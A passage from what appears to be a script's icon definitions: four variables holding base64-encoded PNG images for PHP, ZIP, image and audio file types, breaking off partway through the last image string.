            php_icon = "data:image/png;base64,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",
            zip_icon = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAAXNSR0IArs4c6QAABBBJREFUaEPtmW1sU1UYx//Pufd2g3XtKKxbiyuixpH5hvgSzVAwBJAoGqMhGvygnwx+MUYTSaYWmYZolvhh8YPxgyExAQOKIiMT08QljRhDdIlEnCEBLCvd5ti6di/tfXlMb4e0XdfasY1b7f1ymnPPPef/O8/zP+feHkKea7jH1aRI6ofMtAVEtfnaXGvdpveeNLvoPtBplp93dZnlp591m2Wg7ev0EMwxFhQQbOx2rI/15Y5LuRUp8bLQe0FwXavIQs//a4CrnYxounTX8g2XQ5n9zgAYC9YeZoinF1J8qu8rAC8+/2jWzF8Z958IZAghwiFHa3RHQYBo0BEDyG5FAGaO1z00lpXSMyIQDTp5ocVnRqCoB3LEONdHszRXAOYarbl4IDWW5SJQioktCVDxQG4OL/YqVPYpVPYAFQ9UPDDHnew/s5FVPFDxwP/VA9s7HsNEQsb+znfQsMJlfhPH45M49FUPaqpVHH3teN6psczbqP/w/Qj2eXD3Hc149aWd+CYQQPDkaVyKDGNjSz/eeuqUtQEuXrZjz9EnsHPHc7jnzjWm2F9+/R0Hj3yB9u0HsaJ2ytoAUDxI3nwCJDuzhBpaFFVnNwNaxNoAmu9jsGMbxOC3kE/5TbHavXthuLeAol2QQ7usDaC2nAFEDWzHHgBNDZhiuboRycdPAnocypkWiwPc/qcp0NbTCnam/6sSYz4kHg6av5XTvvIAoFgQcvh1AATN2wGubS0vgNn2wbKJQNkDiPAJyD+/nV6F1rXD8G4urxTKuwqVk4mrum+E0WikV6EBgcTW8+UVAaXXB8jTTtAAdW16ebW+idf8Bsh2KH0PAmp/mkC5AWrzD4Aag9J3m7X3Ad31CQzvVlA8CLl/eh9Y2QG2t0KEjkGKvmxtAArfguTGLwFbXbbQ5ChsgW3gpumo5GBY5ntAXBRg3QNt3Zsw3BvSJh4KQu59HxDnwN60sXOv4gDf1zHkRTikSRLEBQHoORIlwFitXzV25m2V4HxktPAJzfCRepbrk7NtkPNaTyqAQQEaT2viGga7GVDyT6AescH1zFBhgMgHPq6+bww0SyfzSlBCZ5wUmPzJAc/uC4UBBvc1sc4SqprHIS1XsSjpVAhEI+h/KUj8UQNJ0uF+I1TkkO+jep4YsoONGed/JczX/DclycBS9zicu4qk0EhnAwtFR2J0CbQpGbjeIIIhL9FQVTcJY0rCslcGinigfVV0aUPcQWIRVqISAsW6wETEPtroP78s87EZeXLJf9MBkoxnU8RytQZcbxCDoE3KZkYYKu33vnvuhYIA4bbVq1jQj0RoLGGCFrwpMYWh0VrPvrNDBQFSN0Ntt66USPcbZGwSRFkhW3ClOQMYzCOC6DtNqHt9e0Lh3PH/BgBncE8hjjUqAAAAAElFTkSuQmCC",
            image_icon = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAEAAAABACAYAAACqaXHeAAAAAXNSR0IArs4c6QAAFdNJREFUeF7tW22THFd5Pfd239vd87bvu3q3BYldFQwmoVJxgELgouL8CX8M3/MJfgbloiii2ALbBEwZSCWO7TiyZEkJKhkbJS5swAbiAJZlSSvJuzuvPd19U+e5t2dmtSthDKlKlTWqqdnp6Zf7nOec8zz3dkvhA/5SH/D4cRuA2wz4gCNwWwIfcALcNsHbErgtgQ84Arcl8IUvfMHs27evDaAxGAz0B4EQeZ6Xb731VvfJJ5/sqkcfffTQvffe+/l2u32Pc878oQBwzr2vU1VV9Qc9brfzDQaDrZdffvk/jh079qJ64okn/vxTn/rU3y4vL39ea20BvL+Rzw7buVueZLdB3QjYbgDKwG4A9lbHzf42+/fW1tbVU6dOPfblL3/5W+rxxx//5P333/+l1dXVv46iSBigfl9nmADgPJzhfPzg+CUGNYMz/wyBTbbOfPd/hnPJX2GvsF3OGTI3DXR2f3/++qjNzc2rx48f/8ZDDz10TAD43Oc+98W1tbUHyIDuqFIb/QpFGVL6vsDwF9+NSpME1mhsI3x9hNuRBCZFK+cBDCDU54oUYGMHfvK03E/L+YEyvDUckkhzu9vc3Fx//vnnH90BAJSyr/x6rE6/UeL60Pvh+4pfjnTTzKsARp2mXXQm19Fh8DEQRQAiINJAwwKLTaBhgEEB9Av/WVRAGgOLDYe1FtBOgJhgaIcs9r9fHwHd3CFDiQ+1FRpGu83Nrd0BqKDsv706Uo+/pHGxyxG8v/AnRzEjISv8rGr6z1KD2YKSgI0BrHFQ/EwUWhmQWWCpDeztAHMpMCyBt7aAd7Z88HfMAQsNoJUCbQukEUEULNEbAxe7wFZeYkUN8RdLFRbSyG1u3QQARwBey9U3XyYABupGM9g28FuYNZNfBy5Z9d9J2bLynzVISgNxBDQTYL4JdFpAmgLNDFhp++1x7NlBABox8KsN4O1NYKkB7O8AowJ4dwikFpL5fg70x/49LHitEgfNAJ9cKjCfagHg+PHjj37lK1/Z7gEE4MRPc/XEeY1LvRqA98cCYTQzQQA0RJ98jctghIFfpHhqfJbvWAHW5oG5JpAkXgakMXFPYmA+BVoWeKcLXO758/G3q33/5nnIil7uQSHoNnJoRCXuSPr4xEKJdkIJeA/YAQAlcOpnuXryFY0rfQMV/v0uhVlIMkN7BkgAqE1uJwNqFnBXBpkYYG0O+JP9wN5FIDbAqAI2R8Co9B6w3ABWMqBtgCsD4M0NYGPkAdoaARt9b3iWvhH56xlhl0MWlTho+7h3rkDbUgI3AYAMOPN6rv7xxxrrAYBJNL+tOwiuK9ye1X7IPoHgT/QBDrQ+HcExMbDSAT68F+g0gWHljY6ViMEvZEAnAdaaQNN4Bvzyut+H5yMAW0OgP/JyWmp6uVBquVysxH5DBkwlsCsDCMAPfp6rp17TuDowoSFQvmSHoGraTVhRB1PvU/8Q9q9lMAsAmz3ZXXl9Zwmw3AHmO0CpOWgfGINZaQKLmQ+cQPCYSz3gSs8HSIZc2gI2Bh4wymBfB1ht+fNcGzgM8xJ7TR/3LRdYyJTb2NhcP3ny5O4ecO6XuXr2dY1rg6kH1FkiVRkIdUwaczsjycf+OwObmFtgArVPSvI4Bi3Bh3IoBmi84S22gdj6gPg7j6GeWdrqd9N6ylPvlAf3Y9D8mwDQ8CiBtTakLLKVud536A5LrMV9/OXKWExwY/MWALz0Zq6e/7nGu7mBjpRUAmu8MS20vBmNQw1mUIyqN/Qa5GcVGihpSEj/8CYyHDAzK01SYIyOAGuBdsO7PzfzOAZi+FsAYa3h+4Du2FeA60MgiTwrqPVLXeDCpgdoPvPbea3NkYMrS6zGPXxiscBcoqQK3JQB53+Vq9NvamyVBsYomFghS33w1BapyOCEAaSwBsoSuLwFXHgXGOQiOaDywVPf3I/7c3D1XEd6grr5oREmvpazlFH3PK+TpgZYSNnsAElgEUseDZDJYFXgeQnKbzY8gzLjwRmxDJYOsSqx3/bwZ4tjzLEK3AwAQNlX3srVuQsaIxg0M4VWShD8xagvvqQ0OZ8hNh/Uam8EXO76GlwWwJhA0JXZ1QXZUCp5MC6eR+Z9dZmMvRzaqacwGUC9M7sMiC8ey+0MTo53wNgB1/o++13KIpTfidzgoGmCtodPLI3RSZV0gi+88MKNHrD6AE3wjctj9do1DWUM2qlCGisZ6Ljy6FJnErwGqEnSkhnm79RjQZqXQJ4HNgQzE8NiczKcmpzIgJ3bzJssmAAA7wMMupt72pNJ9BWCzqSQKaz79AWen6whywiO2JBy0gitRT18fCGfMODEiROPfvWrX502Qqurqw9wLnBhI1e/GdC1DCJeySkpW4MxsJn7QLmZ2ecAmA22n/xkpgmWC7V+GDoyHk+7oFQoEb4JJgHj/oqBUCqs3zxfAJXAsvnpWA88ac/urmYf6S9MCZIUU2RfkPuWWfoM7VBVJRZcFx/pjNGxym11uzsZIABA2YtbubqYRyi1L4OVU3JSDoC9deX8TIvIx5ESjdIX2KKKbusOL+ieg6FxERSWUwbNLo2VhJQmoI4yYCCB2nUjxeCWM2Ap9UEStPoCtVkSfBNKD8fFzLP8cbKUVxyzQy8v0Sq7uLuZo2W12woesIMBSin7m81c/XoYoVAGSvvg+ZYOLnQv4ux1p6XVhAXcJhkl8srLgdTtUfd1dSAbQqfI83KwpC0PKphJbwsiMb6ZZXZ/9eyZQJN9BHVQAnOsUNbjwu8EgMDVE69B4bDeK6FGXRxOczRj7ba6vgrslACU/Z+NgXqzp1CZBFpHKCqywA+QVHJV4TMfxYg159dKAuJgyQYaF7NK9JltMkeCDJokS7hvPUEiTettDIBdILPa4XTWAf0gE5ldK6BJALTPMF/zCdCMPHDcxiSJFPnJOUTky+C438UcciSREgbQBHcAUDlnX33rgjp/YR0qbaKRNqFji9gmcFWFzY0r6G5dRdZIsbZ6EJ32ErSOhd41CMxebZiz7AmGL8Eym/zkzK32DgYt9KXBsnlikCWwEXxHphihLPIaZBoBZ2msqwFZKuwL1+B5GrFDpkpUwy7seAQjAHgP2BWAs6+9qp77z/PojgskNoExFmnWQFmU2Lh+GaPhJpqdDHcevguHD38Mnbk1hjOp7/WUd7bfDwz3XWJgAmlKAJhNyoVAMCgCwP2YfWqeTBIGBmnU02wxuCAlXqt2fYLDDlPOSQlFDokq4QZdmPEIkVauG0xwJwBVZc+88l/qn8+dw7V+F5EsIfEqDkVewJW5uHVsI8zPt3D4w3fjzsMfR7uzBxWMDJpskNekDE3XBiYtMDMcjJSDbLCCKGDAoJnFumucCV4YcMMSzSwYM1OQiQfx3FnkODK4fhfxeETZTkzwa1/72rQMrqysPEAJnDl/Xn3/Bz/A9X4PURRDx1pa02KcQ1WFrNporRHFwMJSG4fu/GMcPHgP5hYOQMV22ufvspo0mSeEZoUazbgYwm6SGq58YzN5zSyh1QBMAq2n3GHD7NoNWcA3JZJph8gVKHtdRARA+TJIE9wVgNPnf6S+e+o0rm5tIYpjRMYgiiNpJpQb+4lN4F6SxujMtbC8cgAHD34ESyv7ERsLo2NE3FEpOMdVBf+aSCEMngCIeYaKMQpUrktpLZnZ7M4C4Rud6bnr8snghWEKSDXn3wXyXhcmH8HoqQluA2B5efkB55wVAF44hSsEgC4fRfKOYgWNCpqIxkrexsQwqUUcJ2i1FrGwuIIsydBuzWNxYRmdzjzSJBXGyGBnZREGX9+KIgOki5whAMe+nfY+2tk1qtnZZ72vTMEpM3EnNkIFim4XyXgIo6YesAMASuDkS2fVk6dP4Hp3iIi9ANgKc3gloApoXUEzeBshSRPYpAGtEygYxGRMpJHYDO32PPas7MWBfQex0JkTIEzM8wWDuGFluG636eTcSXqNWS/hSMLss875NiBmJMHsS5mVDtRJ6RYA8iHiwIBTp05tlwAZUFWVfe7cSfUPJ/4JG4MRrG6grAqMxwMUeR/OjaVbU0bDpDHSZoZG1kRiOohVh1UXFAslw9YuiRMsLSxgZWkJB/cdwp37DiFNEukmByOHzWEV5v7sNRyGo1KarthoabP547ioUBaVzEo7jRhpEkn/MQ1+5q+wGiweUN8jIABlgYIeMBqIB7AK0AOOHj3qTfDIkSNf9CZY2Wf//Xn19ae/jauDDZgkhXMcQI5iOJJmXvHiRiNKYpjMCAuyRhOJbSOuCEQL/gaTH5j09onFntW9+NjdH8Ed+w+hdCnevlbi8sZYAqfUWCEYLMuHNUqOG+YF8pwJKKVvWOjEWGxbzDUMFtoGKVvCyT0H7zWT1egwAjIATGK3Cz0aILolAFVlnz51XD3y/W/iUv86knaGmMtAzqEY5ihHY7iKICgoVodYI7JkQoK0lcHGGaxqI0YTimyIPOV5jE0s9q4t4+DBQ3B6Dlc3x+gNh3KbS2sDE7eRxPOIdMpaLYGNxxXK0qGsKmnE4pgdqGfCodUM+5YStLMIhmNRXLypdTXLimCC3S4wHIgEbsqAkgCcPK6OfudxXNpch2lnMFkCHUfgPbeqKFDmY7jC96GyYhRAsAShmSLWkXiHjRswEb0hQlVWqFQF3nrNWilUlKAoChTVCFAVotggtfNoZXtgonkoxOI9kW7AmiVo1QRvqFZlgcrx2mO0sgir8y2sdlpopxbNNMJSx6KVxh7AmhrKm+Co20U16E8YwE5wmwRqD/iXE8fV3z3xTby9fgnaGqG6NqwEvr9kJthbC8ZEnWzQSthgGgli7s8ZWqwRRxFiE0uAJRxKxyrCRspPtARULh8phzjSMIbZt3AVs6mRJU20GgcQYQ7jokRZjVC5HE6N/FJdNId2tgdNu4hmmmHfQoYPr7WxdzFDw1pESst+VVmi391CMeiTKZNOcFcAniIA3/4WLly+BMUMRwzO328SlbE28S9Z9fVUlQ82R4lBnCUiC839GRgrRprIjM9VJLyDsQbGskB5EBxohqXsTw/gpIvSjeMIjWYbcZyhEADGcK6A5ioTx1RGiHQbabKExLaQWos9c00cWu5gtd3GYnMBrWQOyhm40RgJxjBau27PzwUmAHzmM5/xJliW9qkTz3sArlyaZJc0r/tTDtpnfxo4fyNDosR6AJIEEdfRfIihISqhuI/0Fewkw4xF7h4FdjlqvUQ5HovUeCz7DNtMJQnMJDsFfw4lsqA/mSyFTVJJAiWY2lgYsNCYRztdhMEC9mVL+OieFcpFGMAyuA2AiQROnlRHn/gOLqxf8Y7Pd7ivNftswlQC/J1UIwsixImFMmyhKQVPQclyWQookbFhXw+igBFFArbc+a8qlOMcxYitt5NATWbFiyagC+C+3PI4npfzkykrnWy31iKmwaoUdy8cwv1/dA8Wm62dAHz6058OZdDZp0+/qP7+e/+Kt9evTQCQsdWVl7oX+fslc+ny5AaB38Nn0zOCHaR4BLUot8F8VzlljxKay37Bwr10aAuVbKOh8TiRVUzK8zsZFPnAw9vwe6SkXHKfxESwxoTVK4V9jTY+uucA2lnjFgBUzj5z9lX1yFNn8fb6ZtAxg/SuKqUmeIF/YKHeFlrd2e/0BLkzOvWLSEdyjFO+9lMGJhisAMcb5ZqgaAFGAmew0pLXIGqkqUFCQAgQjTaOYOMYmdHSGyT0DhvLJ0GMtUI7clhuWCTW3AQAdoIO9tlzP1HHnn4Jb1/jXIB9Hants+0zLhYYvgcQQvPNFSS+KQVPbc4ktRggg0goAU3t0hc0IsPfmWWfUTKJrsFtzKippSFL8JGsRPH4VmrQTFgq/Vi4jd1hZiMBgB7A4Lk///GJkUZUYblpOAYB4PTp094Djh07Jo/IiAc4Z5899zP1yDM/wsWrPRnUpMGY3Or27ieMDSzgwH3gbI5ioTyDYmmrQWBABMBG2t9GC8DKOWoQoigsfjgk7C+0nix0MDDLoLSSTDcs+w2/XMdAGTDPQ+pnieXKj5eLdJmVLIocWEjRSLwJ7goAG6FnX3xDPfzMK7h4ve9ngaJxP5UTyrN+c61dpE50mT2WPe8FXofszOq/vW55HAfP7RNQZfnKG6jcRovYcPmpjokIoJcYPwmmP07BxlqA5Pl4TQZNANgxUj6dRoKURhxKNXPFZwQOzKfIEuN6vd5OAJaWloQBz7z4c/XIcz/GO+8OA/X96oI3OG96YmIib69BG3MmKF13GLzPlJcM7y77h558sDVlfXXgiyzxfRW31XeNNdIZGlOGBEXkwRlnYIRPAiXj1+Q5vFZqkfGWFKfYpX94aqUV4dDiTRjw2c9+9ovLy0sPlBXscy/9Qn395E/wzuYwLDZIJfdTVLkjE5y/9gRmSPTq3Z+UlKwFs6zvIPuJUQBEVpFJdz715bvAkk2SBEDVsoGipmP5TW6jh0wzs7wWA04Tg7KskBelPGckXR+7TeXZk7HhYhtflji4kOBDqw1um5jgww8/7D2AANQMeO5H/60eP/063tkYCnVpYPUcnSsspDi1t60sMgOs18wC1w+4JD1Dv7piUNeMpiQjZPWHEyHPDB5Dc2Rw1GzFx9riGM00hmXQWsOaSLJLUPJxKWMh2EVZeXZxWS0v5Dvp30wNNY+yLHHHUop79s+hkcQigTNnzkxNcAIA1wPOv6keEwAGk5bX38mlPzOwujaHMie3pTzFmR0OjoHI/qFnkCVz6pbt68zDnhw8MyYlljuFNX3xGTE3T3XxFHpIpNFmKYsi9Eb5RG78g85PELrDsfcCPntkjXgDyUkGEIBWNu0EtzFgcXFRlsTOvPpr9f0Xf4n1rdG2p1K9Xr0RSvfFjEhT4xct+Du1LFIIL9lXAmam/W/S8cl3X+rYzlKnYW4ljBCKs4qEOi4+IQAodDLrAx3kcg4GPnnRD7h6WbFdVmhybiIepbDWtji83BQTrFvhXQG4sL6lfnHxulBpdsFRwg/3BX31DabFXIuW/TBquteLE9wmjKgfnZOs+zkCMypPfoaDPW88RXiFWv/hzCIrVgDuQ9AIML8TtBFXjkonLOPkSm6iSNkkkL5BYv9gomgnAEeOHPnS4uLiX/HeoHNO1RSePu4aopssWdePrPoNfvy77FOnJkhousvNnvv1UttxznD67c8Iz5zc82yGsTNr64GFdXbIvx0M4GyQEiAA/uLTE/wuf297UDlMdSfDDI5fT6I8a7xPTBggmZ8+QTZ7bD2u+uHNXZ8mn52tTYUxoxC5OgG4eubMmW8cPXr06+qhhx760/vuu+9v2u32Ed5LuBGAWwEye42bAeUl8N7+D8DN/o/Be/m/B791n1qDrBSDwfWzZ89+97HHHvueevDBB1fvuuuuj2mtP1QUxS3/wwTLyf/l670C9fuOoSiKwRtvvPH6D3/4w59KZVtZWckGg0HWaDTEwnu98Bzqe7xSs9l8j3v+/9it3+9XaZoO19fX+/8LEwHPq2gLk4cAAAAASUVORK5CYII=",
            audio_icon = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAYAAABXAvmHAAAAAXNSR0IArs4c6QAABqdJREFUaEPtmGtsVEUUx/9ntrQF2bsIdFHiAxP4YAQ0PjAarERAvkArooS2IuLuFuxuETXxFY31kYjRWKW7q213WyUtpaBCWxB8EUURFCGi8RmJmJhqt6bQu+Wlu3PMnX2w3ba2bB9C0vl05945c8/vnDMz5wzhHG90juuPYYD/24PDHhj2QD8tMBxCMQOWlLA48GPrbghMZZaHIGgvQA1NtVk7AOJ+GrpH8QHyAFNOfms9gDu7+dM+U1gs21w//ofBgBgQgJy8QCkIq3tSUILbiUxzm2rH7xtoiH4D5OQHngXwRGfF+BQYbhDdB2CU8Y3Bzab09Cu2vHH+0YGE6BfAgoLW1cRc2o1CxxrXW0fnFvw5jVnsBDBeQRDWNNVaH+srgNsXzBbgsffZzA1E3a+jlAFyCwJONqx8uh0GMCnaVQDG84K8lkVE9FbMC03rrRf1ZVF7/PpMlryLiAggt9NuLu4OPCWA3PyWuyWjmohEZFLeKVnUCeLKZABjd9r/U+sfRLAa30SYJ2+pn3CoNy+4K/T5JNAUH8d4zOnQ1iTLnTFATn7L7QDqAUpTk0nsxSi6VRyn26SQ65IBjH5OXssuEN1kPJNAdkON9dPeAJiZPP6OGgLnKxMxM0ALXQ6tIVH2jAAWFLTcSkyNADIihsfBjFDGLZs2WdpuW/LX0p4AcvNbP2TwbMVLcs7W2gs+iilRXt52SViYskMjQ42r7hqnJypXXs4jQqaObQDPjYbgXyE2TV3tGN0SG9cFwOMJjOb0kUtBPFsA45jpdafDXJ+TH8gG4z0QMqMW+T4UkrO2b7qw1einArBxI6e36PphAboQTAcyxclZNltWMBGitPrImBEh8Q0RXazeE9U5bWblFdVNHFxWGZwlIOtAdEH8vYTuLNQsiWEggUNCUnbjhqzm2LhUAF5c9+d5o05ltoLESOUdiW0uh3lB8o7j9nXMBoc/MBa0CiUW01yF5u86Abzma58RZnxCRMrCic1p1ygnL/A1CFdGsHlmY+2E3YljUgEw5L0+fZlkNjaEqDFppdNuLk/WwVN59B2QWKjeS1Q5CzVbHMDYKawTgwdYRBVkbgbRxNgkyQBS8FVbayYcHAgAYw63T19DwCMqNIkDf5u1SQ8uphOJ87ur2q8naeRXxtLDEatmzlq8mMKK2u3XbyDG51E6XYwIXynDpl+HCmDtWs4wjQoaudJlEQfz0iKHpaarF/TDIFwaAcWNLpu2JwJQ2b6KiF5VAiz9TscYu8enxzPIwfaA8VuPT38YwAsqQhjrih3asmQAb4W+jgWWRiBxb5FDq1YAHn/wKTCXRAD4aafDUjLUAN6q4M0s+eMIgPyk2DFmVhcP+PXnwXg0omfkYOsCwOBnXHbLU0MNUFbRPk8I2hENj50um6bOjcTm8esvgfGQ8gDhoSKb9nIEwNfuAqgsukDedNm1e4YawFsZLGXiaEpOrzrt5i7peZlPf1sARiYQXycKwFt59Bom8VUEgI6nCVwXlqz2WaMN9hpw+45cCjZ9SwSzCiFgZrFd67RNG4deQA/+QcBYNSaMy4tXaD8qgEjeEdxLwIyoF9piAwcbwO9vNZ+UGTtBuFZZVuJgoNl8dUkJycTwcfuCSwhcF43/35wOTWW+8ZO4rLpjGoXk7pgVEoUH6yAz8qB/TGlNBEyP/I9DkviGYtsYFQ2xFt1mvwUwJRolT7rs5uc6ASSE0gYAk2PCDLS57Nq4wUglvH69iRnzo1HAILK77FpVovLGs8cXfAXg+2PRkQmeYrdb2roAGC9UBig6bicKz2FQFjMqXA7Lu4ORzLn9ehUxloPlCQIVdnd4ef3txcy0NgZFTCuKHOaKeD+Z9r/6A51OV1dz5vGQvpCZ9rsKtZ+T/+31B1cyS4+qIpT55eYiu8Wo8OKH7BnVA8YcKRU0+QGjgJmpXN